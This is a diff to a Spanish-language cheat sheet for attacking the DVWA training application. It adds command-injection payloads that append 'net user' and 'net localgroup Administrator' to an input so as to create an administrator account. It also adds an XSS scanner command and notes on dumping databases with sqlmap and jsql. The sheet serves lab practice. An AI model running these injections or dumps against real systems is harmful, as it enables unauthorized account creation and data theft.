@@ -16,6 +16,15 @@ http://IP:8080/DVWA/login.php       # Ruta por defecto al login en un DVWA
 # Windows
 ❯ input && net user    # Muestra las cuentas de usuarios en el sistema 
 ❯ input && type C:\wamp64\www\DVWA\upload\file.txt   # Muestra el contenido del archivo 
+❯ input | net user 
+❯ input | net user Test pass123 /Add
+❯ input | net localgroup Administrator Test /Add
+```
+
+## XSS
+
+```bash
+❯ python3 pwnxss.py -u http://www.domain.com   # Verificar si la aplicación es vulnerable a XSS
 ```
 
 ## SQLMap 
@@ -42,13 +51,24 @@ Nota:
 # BurpSuite y SQLMap
 
 Nota:
-	1. Se puede obtener un archivo de texto con Burpsuite el cual contiene la petición y la Cookie de la sesión
-	2. Dar click derecho en la petición y seleccionar 'save item' para guardarlo como un archivo '.txt'
+	1. Dar click derecho en la petición y seleccionar 'save item' para guardarlo como un archivo '.txt'
 
 ❯ sqlmap -r file.txt --dbs    # Mostrar las DBs
 ❯ sqlmap -r file.txt -D database --tables 
 ❯ sqlmap -r file.txt -D database -T users --columns 
 ❯ sqlmap -r file.txt -D database --dump 
+```
+
+## JSQL
+
+```bash 
+# Kali Tool
+❯ jsql     
+
+Nota:
+	1. Colocar la url que contenga el parametro ?id=1 en 'GET' 
+	2. La herramienta te mostrará todas las DBs y su contenido 
+	3. Cuando se selecione una columna, se debe dar click derecho a la tabla y dar en 'Search'
 ```
 
 ## Inyecciones DB MSSQL 
